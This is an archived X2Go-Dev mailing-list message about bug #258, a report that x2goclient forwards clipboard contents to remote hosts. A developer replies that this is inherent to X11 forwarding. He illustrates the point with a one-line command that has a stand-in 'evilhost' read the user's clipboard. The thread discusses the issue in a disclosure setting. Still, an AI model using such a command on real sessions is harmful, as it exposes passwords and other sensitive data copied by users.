@@ -1,0 +1,97 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [X2Go-Dev] Bug#258: Bug#258: SECURITY: x2goclient allows clipboard	sniffing
+   </TITLE>
+   <LINK REL="Index" HREF="http://lists.berlios.de/pipermail/x2go-dev/2013-July/index.html" >
+   <LINK REL="made" HREF="mailto:x2go-dev%40lists.berlios.de?Subject=Re%3A%20%5BX2Go-Dev%5D%20Bug%23258%3A%20Bug%23258%3A%20SECURITY%3A%20x2goclient%20allows%20clipboard%0A%09sniffing&In-Reply-To=%3C20130701114356.GP2447%40cip.informatik.uni-erlangen.de%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <style type="text/css">
+       pre {
+           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
+           }
+   </style>
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="005906.html">
+   <LINK REL="Next"  HREF="005910.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[X2Go-Dev] Bug#258: Bug#258: SECURITY: x2goclient allows clipboard	sniffing</H1>
+    <B>Alexander Wuerstlein</B> 
+    <A HREF="mailto:x2go-dev%40lists.berlios.de?Subject=Re%3A%20%5BX2Go-Dev%5D%20Bug%23258%3A%20Bug%23258%3A%20SECURITY%3A%20x2goclient%20allows%20clipboard%0A%09sniffing&In-Reply-To=%3C20130701114356.GP2447%40cip.informatik.uni-erlangen.de%3E"
+       TITLE="[X2Go-Dev] Bug#258: Bug#258: SECURITY: x2goclient allows clipboard	sniffing">snalwuer at cip.informatik.uni-erlangen.de
+       </A><BR>
+    <I>Mon Jul  1 13:43:56 CEST 2013</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="005906.html">[X2Go-Dev] Bug#258: SECURITY: x2goclient allows clipboard sniffing
+</A></li>
+        <LI>Next message: <A HREF="005910.html">[X2Go-Dev] Bug#258: Bug#258: SECURITY: x2goclient allows clipboard	sniffing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#5909">[ date ]</a>
+              <a href="thread.html#5909">[ thread ]</a>
+              <a href="subject.html#5909">[ subject ]</a>
+              <a href="author.html#5909">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>On 13-07-01 04:56, Christoph Anton Mitterer &lt;<A HREF="https://lists.berlios.de/mailman/listinfo/x2go-dev">calestyo at scientia.net</A>&gt; wrote:
+&gt;<i> Package: x2goclient
+</I>&gt;<i> Severity: grave
+</I>&gt;<i> Tags: security
+</I>&gt;<i> 
+</I>&gt;<i> Hi.
+</I>&gt;<i> 
+</I>&gt;<i> From: <A HREF="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=714588">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=714588</A>
+</I>&gt;<i> 
+</I>&gt;<i> 
+</I>&gt;<i> It seems that per default (and I even found no way to disable it)
+</I>&gt;<i> x2goclient (and perhaps other related tools?) transmit the content of
+</I>&gt;<i> the clipboard to the remote host.
+</I>
+Yes, other related tools like X11. x2go is basically just a faster
+version of the traditional xforwarding. In X11 every client can always
+access the clipboard/selection/etc., so you will also have the same
+security problems (by design). E.g. 'ssh -X <A HREF="https://lists.berlios.de/mailman/listinfo/x2go-dev">user at evilhost</A> &quot;xclip -o&quot;'
+demonstrates this.
+
+&gt;<i> As this may easily contain passwords or other sensitive information,
+</I>&gt;<i> this is a extremely critical hole.
+</I>
+I disagree, this is not a hole at all, it works as intended. Its just
+that users are often not educated about the implications of passing
+around passwords via the clipboard etc.
+
+But I concur that the ability to switch off clipboard/selection/...
+forwarding in the x2goagent/x2goclient would be nice to have. Patches
+are of course always welcome.
+
+
+
+Ciao,
+
+Alexander Wuerstlein.
+</PRE>
+
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="005906.html">[X2Go-Dev] Bug#258: SECURITY: x2goclient allows clipboard sniffing
+</A></li>
+	<LI>Next message: <A HREF="005910.html">[X2Go-Dev] Bug#258: Bug#258: SECURITY: x2goclient allows clipboard	sniffing
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#5909">[ date ]</a>
+              <a href="thread.html#5909">[ thread ]</a>
+              <a href="subject.html#5909">[ subject ]</a>
+              <a href="author.html#5909">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="https://lists.berlios.de/mailman/listinfo/x2go-dev">More information about the X2Go-Dev
+mailing list</a><br>
+</body></html>
